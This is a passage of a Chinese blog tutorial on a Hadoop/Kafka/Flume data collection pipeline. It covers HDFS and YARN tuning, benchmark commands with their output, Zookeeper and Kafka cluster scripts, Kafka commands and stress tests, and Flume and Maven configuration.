tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.vmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-5-项目经验之基准测试"><a href="#4-2-5-项目经验之基准测试" class="headerlink" title="4.2.5 项目经验之基准测试"></a>4.2.5 项目经验之基准测试</h3><p><strong>1） 测试HDFS写性能</strong></p><p>​    测试内容：向HDFS集群写10个128M的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -write -nrFiles 6 -fileSize 128MB2020-04-16 13:41:24,724 INFO fs.TestDFSIO: ----- TestDFSIO ----- <span class="token keyword">:</span> <span class="token function">write</span>2020-04-16 13:41:24,724 INFO fs.TestDFSIO:       Date <span class="token operator">&amp;</span> time: Thu Apr 16 13:41:24 CST 20202020-04-16 13:41:24,724 INFO fs.TestDFSIO:     Number of files: 102020-04-16 13:41:24,725 INFO fs.TestDFSIO: Total MBytes processed: 12802020-04-16 13:41:24,725 INFO fs.TestDFSIO:    Throughput mb/sec: 8.882020-04-16 13:41:24,725 INFO fs.TestDFSIO: Average IO rate mb/sec: 8.962020-04-16 13:41:24,725 INFO fs.TestDFSIO:  IO rate std deviation: 0.872020-04-16 13:41:24,725 INFO fs.TestDFSIO:   Test <span class="token function">exec</span> <span class="token function">time</span> sec: 67.61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）测试HDFS读性能</p><p>测试内容：读取HDFS集群10个128M的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -read -nrFiles 10 -fileSize 128MB2020-04-16 13:43:38,857 INFO fs.TestDFSIO: ----- TestDFSIO ----- <span class="token keyword">:</span> <span class="token function">read</span>2020-04-16 13:43:38,858 INFO fs.TestDFSIO:   Date <span class="token operator">&amp;</span> time: Thu Apr 16 13:43:38 CST 20202020-04-16 13:43:38,859 INFO fs.TestDFSIO:         Number of files: 102020-04-16 13:43:38,859 INFO fs.TestDFSIO:  Total MBytes processed: 12802020-04-16 13:43:38,859 INFO fs.TestDFSIO:       Throughput mb/sec: 85.542020-04-16 13:43:38,860 INFO fs.TestDFSIO:  Average IO rate mb/sec: 100.212020-04-16 13:43:38,860 INFO fs.TestDFSIO:   IO rate std deviation: 44.372020-04-16 13:43:38,860 INFO fs.TestDFSIO:      Test <span class="token function">exec</span> <span class="token function">time</span> sec: 53.61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）删除测试生成数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -clean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）使用Sort程序评测MapReduce（要求性能特别好，普通性能不要去跑）</p><p>（1）使用RandomWriter来产生随机数，每个节点运行10个Map任务，每个Map产生大约1G大小的二进制随机数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar randomwriter random-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）执行Sort程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar <span class="token function">sort</span> random-data sorted-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）验证数据是否真正排好序了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar testmapredsort -sortInput random-data -sortOutput sorted-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-6-项目经验之Hadoop参数调优"><a href="#4-2-6-项目经验之Hadoop参数调优" class="headerlink" title="4.2.6 项目经验之Hadoop参数调优"></a>4.2.6 项目经验之Hadoop参数调优</h3><p><strong>1）HDFS参数调优hdfs-site.xml</strong></p><p><strong>NameNode有一个工作线程池，用来处理不同DataNode的并发心跳以及客户端并发的元数据操作。</strong></p><p>对于大集群或者有大量客户端的集群来说，通常需要增大参数dfs.namenode.handler.count的默认值10。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.handler.count<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>dfs.namenode.handler.count=<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637663793390.png" alt="1637663793390">  ，比如集群规模为8台时，此参数设置为41。</p><p><strong>2）YARN参数调优yarn-site.xml</strong></p><p>（1）情景描述：总共7台机器，每天几亿条数据，数据源-&gt;Flume-&gt;Kafka-&gt;HDFS-&gt;Hive</p><p>面临问题：数据统计主要用HiveSQL，没有数据倾斜，小文件已经做了合并处理，开启的JVM重用，而且IO没有阻塞，内存用了不到50%。但是还是跑的非常慢，而且数据量洪峰过来时，整个集群都会宕掉。基于这种情况有没有优化方案。</p><p>（2）解决办法：</p><p>内存利用率不够。这个一般是Yarn的2个配置造成的，单个任务可以申请的最大内存大小，和Hadoop单个节点可用内存大小。调节这两个参数能提高系统内存的利用率。</p><p>（a）yarn.nodemanager.resource.memory-mb</p><p>表示该节点上YARN可使用的物理内存总量，默认是8192（MB），注意，如果你的节点内存资源不够8GB，则需要调减小这个值，而YARN不会智能的探测节点的物理内存总量。</p><p>（b）yarn.scheduler.maximum-allocation-mb</p><p>单个任务可申请的最多物理内存量，默认是8192（MB）。</p><h2 id="4-3-Zookeeper安装"><a href="#4-3-Zookeeper安装" class="headerlink" title="4.3 Zookeeper安装"></a>4.3 Zookeeper安装</h2><h3 id="4-3-1-安装ZK"><a href="#4-3-1-安装ZK" class="headerlink" title="4.3.1 安装ZK"></a>4.3.1 安装ZK</h3><p>详见：</p><p>集群规划</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Zookeeper</td><td>Zookeeper</td><td>Zookeeper</td><td>Zookeeper</td></tr></tbody></table><h3 id="4-3-2-ZK集群启动停止脚本"><a href="#4-3-2-ZK集群启动停止脚本" class="headerlink" title="4.3.2 ZK集群启动停止脚本"></a>4.3.2 ZK集群启动停止脚本</h3><p>1）在hadoop102的/home/molly/bin目录下创建脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim zk.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>#在脚本中编写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashcase $1 in"start")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo ---------- zookeeper $i 启动 ------------        ssh $i "/opt/module/zookeeper-3.5.7/bin/zkServer.sh start"    done&#125;;;"stop")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo ---------- zookeeper $i 停止 ------------            ssh $i "/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop"    done&#125;;;"status")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo ---------- zookeeper $i 状态 ------------            ssh $i "/opt/module/zookeeper-3.5.7/bin/zkServer.sh status"    done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x zk.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）Zookeeper集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ zk.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）Zookeeper集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ zk.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-4-Kafka安装"><a href="#4-4-Kafka安装" class="headerlink" title="4.4 Kafka安装"></a>4.4 Kafka安装</h2><h3 id="4-4-1-Kafka集群安装"><a href="#4-4-1-Kafka集群安装" class="headerlink" title="4.4.1 Kafka集群安装"></a>4.4.1 Kafka集群安装</h3><p>详见：<a href="https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/">kafka学习笔记（一） kafka搭建</a></p><p>配置文件：</p><pre class="line-numbers language-bash"><code class="language-bash">log.dirs<span class="token operator">=</span>/opt/moudule/kafka 2.11-2.4.1/dataszookeeper.connect<span class="token operator">=</span>hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>集群规划：</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Kafka</td><td>Kafka</td><td>Kafka</td><td>Kafka</td></tr></tbody></table><h3 id="4-4-2-Kafka集群启动停止脚本"><a href="#4-4-2-Kafka集群启动停止脚本" class="headerlink" title="4.4.2 Kafka集群启动停止脚本"></a>4.4.2 Kafka集群启动停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本kf.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim kf.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashcase $1 in"start")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo " --------启动 $i Kafka-------"        ssh $i "/opt/module/kafka/bin/kafka-server-start.sh -daemon /opt/module/kafka/config/server.properties"    done&#125;;;"stop")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo " --------停止 $i Kafka-------"        ssh $i "/opt/module/kafka/bin/kafka-server-stop.sh stop"    done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x kf.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）kf集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ kf.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看zookeeper信息<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637664623705.png" alt="1637664623705"></p><p>4）kf集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ kf.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-4-3-Kafka常用命令"><a href="#4-4-3-Kafka常用命令" class="headerlink" title="4.4.3 Kafka常用命令"></a>4.4.3 Kafka常用命令</h3><p>1）查看Kafka Topic列表</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181/kafka --list<span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --list<span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2）创建Kafka Topic</p><p>进入到/opt/module/kafka/目录下创建日志主题</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka --create --replication-factor 1 --partitions 1 --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）删除Kafka Topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --delete --zookeeper hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）Kafka生产消息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-producer.sh \--broker-list hadoop102:9092 --topic topic_log\<span class="token operator">></span>hello world\<span class="token operator">></span>molly molly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5）Kafka消费消息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --from-beginning --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>–from-beginning：会把主题中以往所有的数据都读取出来。根据业务场景选择是否增加该配置。</p><p>6）查看Kafka Topic详情</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181/kafka \--describe --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-4-4-项目经验之Kafka压力测试"><a href="#4-4-4-项目经验之Kafka压力测试" class="headerlink" title="4.4.4 项目经验之Kafka压力测试"></a>4.4.4 项目经验之Kafka压力测试</h3><p><strong>1）Kafka压测</strong></p><p>用Kafka官方自带的脚本，对Kafka进行压测。Kafka压测时，可以查看到哪个地方出现了瓶颈（<strong>CPU，内存，网络IO</strong>）。一般都是网络IO达到瓶颈。 </p><p>kafka-consumer-perf-test.sh<br>kafka-producer-perf-test.sh</p><p><strong>2）Kafka Producer压力测试</strong></p><p>（1）在/opt/module/kafka/bin目录下面有这两个文件。我们来测试一下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-producer-perf-test.sh --topic <span class="token function">test</span> --record-size 100 --num-records 100000 --throughput -1 --producer-props bootstrap.servers<span class="token operator">=</span>hadoop102:9092,hadoop103:9092,hadoop104:9092<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：</p><p>record-size是一条信息有多大，单位是字节。<br>num-records是总共发送多少条信息。<br>throughput 是每秒多少条信息，设成-1，表示不限流，可测出生产者最大吞吐量。</p><p><strong>（2）Kafka会打印下面的信息</strong></p><pre class="line-numbers language-bash"><code class="language-bash">100000 records sent, 95877.277085 records/sec <span class="token punctuation">(</span>9.14 MB/sec<span class="token punctuation">)</span>, 187.68 ms avg latency, 424.00 ms max latency, 155 ms 50th, 411 ms 95th, 423 ms 99th, 424 ms 99.9th.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数解析：本例中一共写入10w条消息，吞吐量为9.14 MB/sec，每次写入的平均延迟为187.68毫秒，最大的延迟为424.00毫秒。</p><p><strong>3）Kafka Consumer压力测试</strong></p><p>Consumer的测试，如果这四个指标（IO，CPU，内存，网络）都不能改变，考虑增加分区数来提升性能。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-consumer-perf-test.sh --broker-list hadoop102:9092,hadoop103:9092,hadoop104:9092 --topic <span class="token function">test</span> --fetch-size 10000 --messages 10000000 --threads 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><p>–zookeeper 指定zookeeper的链接信息<br>–topic 指定topic的名称<br>–fetch-size 指定每次fetch的数据的大小<br>–messages 总共要消费的消息个数</p><p>测试结果说明：</p><pre class="line-numbers language-bash"><code class="language-bash">start.time, end.time, data.consumed.in.MB, MB.sec, data.consumed.in.nMsg, nMsg.sec2019-02-19 20:29:07:566, 2019-02-19 20:29:12:170, 9.5368, 2.0714, 100010, 21722.4153<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开始测试时间，测试结束数据，共消费数据9.5368MB，吞吐量2.0714MB/s，共消费100010条，平均每秒消费21722.4153条。</p><h3 id="4-4-5-项目经验之Kafka机器数量计算"><a href="#4-4-5-项目经验之Kafka机器数量计算" class="headerlink" title="4.4.5 项目经验之Kafka机器数量计算"></a>4.4.5 项目经验之Kafka机器数量计算</h3><p>Kafka机器数量（经验公式）=2x（峰值生产速度x副本数/100）+1<br>先拿到峰值生产速度，再根据设定的副本数，就能预估出需要部署Kafka的数量。<br>比如我们的峰值生产速度是50M/s。副本数为2。<br>Kafka机器数量=2<em>（50</em>2/100）+ 1=3台</p><h3 id="4-4-6-项目经验值Kafka分区数计算"><a href="#4-4-6-项目经验值Kafka分区数计算" class="headerlink" title="4.4.6 项目经验值Kafka分区数计算"></a>4.4.6 项目经验值Kafka分区数计算</h3><p>1）创建一个只有1个分区的topic</p><p>2）测试这个topic的producer吞吐量和consumer吞吐量。</p><p>3）假设他们的值分别是Tp和Tc，单位可以是MB/s。</p><p>4）然后假设总的目标吞吐量是Tt，那么分区数=Tt / min（Tp，Tc）</p><p>例如：producer吞吐量=20m/s；consumer吞吐量=50m/s，期望吞吐量100m/s；</p><p>分区数=100 / 20 =5分区</p><p><a href="https://blog.csdn.net/weixin_42641909/article/details/89294698">https://blog.csdn.net/weixin_42641909/article/details/89294698</a></p><p>分区数一般设置为：3-10个</p><h1 id="5-项目1-采集用户行为数据"><a href="#5-项目1-采集用户行为数据" class="headerlink" title="5 项目1 采集用户行为数据"></a>5 项目1 采集用户行为数据</h1><p>如下图所示，用户行为经过埋点进行收集然后存放到logserver上，这个时候利用Flume（第一层）从日志服务器logserver上采集数据送到kafka中，再通过一个flume（第二层）接收，最后存储到HDFS中。</p><p>再看flume架构：</p><p>第一层flume，我们source选择为taildirSource,channel选Kafka Channel（这里不需要sink，因为KafkaChanel直接将数据存到Kafka中了）。</p><p>第二层flume：我们source选择为KafkaSource,channel选fileChannel,sink选择HDFS Sink。</p><p>其中flume安装详见：<a href="https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/">flume学习笔记（一） flume搭建</a></p><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637724868076.png" alt="1637724868076"></p><p><strong>日志采集Flume集群规划</strong>：</p><p>我们将第一层flume安装在hadoop102和hadoop103上，第二层flume安装在hadoop104.</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Flume(采集日志)</td><td>（第一层）Flume</td><td>（第一层）  Flume</td><td>（第二层  Flum</td></tr></tbody></table><h2 id="5-1-第一层flume采集"><a href="#5-1-第一层flume采集" class="headerlink" title="5.1 第一层flume采集"></a>5.1 第一层flume采集</h2><h3 id="5-1-1-项目经验之Flume组件选型"><a href="#5-1-1-项目经验之Flume组件选型" class="headerlink" title="5.1.1 项目经验之Flume组件选型"></a>5.1.1 项目经验之Flume组件选型</h3><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637722930078.png" alt="1637722930078"></p><p>Flume直接读log日志的数据，log日志的格式是app.yyyy-mm-dd.log。注意其中logInterceptor主要对原始日志进行初步数据处理，删除空数据。</p><p><strong>1）Source</strong></p><p>（1）Taildir Source相比Exec Source、Spooling Directory Source的优势</p><p><strong>TailDir Source：断点续传、多目录。Flume1.6以前需要自己自定义Source记录每次读取文件位置，实现断点续传。</strong></p><p><strong>Exec Source</strong>可以实时搜集数据，但是在Flume不运行或者Shell命令出错的情况下，数据将会丢失。</p><p><strong>Spooling Directory Source</strong>监控目录，支持断点续传。</p><p>（2）batchSize大小如何设置？</p><p>+答：Event 1K左右时，500-1000合适（默认为100）</p><p><strong>2）Channel</strong></p><p><strong>采用Kafka Channel，省去了Sink，提高了效率。KafkaChannel数据存储在Kafka里面，所以数据是存储在磁盘中。</strong></p><p>注意在Flume1.7以前，Kafka Channel很少有人使用，因为发现parseAsFlumeEvent这个配置起不了作用。也就是无论parseAsFlumeEvent配置为true还是false，都会转为Flume Event。这样的话，造成的结果是，会始终都把Flume的headers中的信息混合着内容一起写入Kafka的消息中，这显然不是我所需要的，我只是需要把内容写入即可。</p><h3 id="5-1-2-日志采集Flume配置"><a href="#5-1-2-日志采集Flume配置" class="headerlink" title="5.1.2 日志采集Flume配置"></a>5.1.2 日志采集Flume配置</h3><p>1）Flume的具体配置如下：</p><p>​    （1）在/opt/module/flume/conf目录下创建file-flume-kafka.conf文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ vim file-flume-kafka.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件配置如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#为各组件命名a1.sources = r1a1.channels = c1#描述sourcea1.sources.r1.type = TAILDIRa1.sources.r1.filegroups = f1a1.sources.r1.filegroups.f1 = /opt/module/applog/log/app.*a1.sources.r1.positionFile = /opt/module/flume/taildir_position.jsona1.sources.r1.interceptors =  i1a1.sources.r1.interceptors.i1.type = com.molly.flume.interceptor.ETLInterceptor$Builder#描述channela1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannela1.channels.c1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092a1.channels.c1.kafka.topic = topic_loga1.channels.c1.parseAsFlumeEvent = false#绑定source和channel以及sink和channel的关系a1.sources.r1.channels = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 注意：com.molly.flume.interceptor.ETLInterceptor是自定义的拦截器的全类名。需要根据用户自定义的拦截器做相应修改。</p><h3 id="5-1-3-Flume拦截器"><a href="#5-1-3-Flume拦截器" class="headerlink" title="5.1.3 Flume拦截器"></a>5.1.3 Flume拦截器</h3><p>在第一层flume中对原始数据进行清洗</p><p>1）创建Maven工程flume-interceptor</p><p>2）创建包名：com.molly.flume.interceptor</p><p>3）在pom.xml文件中添加如下配置</p><p>maven-compiler-plugin是打包插件。com.alibaba注意加 <scope>compile</scope>，把该组件打到包中。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.flume<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>flume-ng-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.62<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token 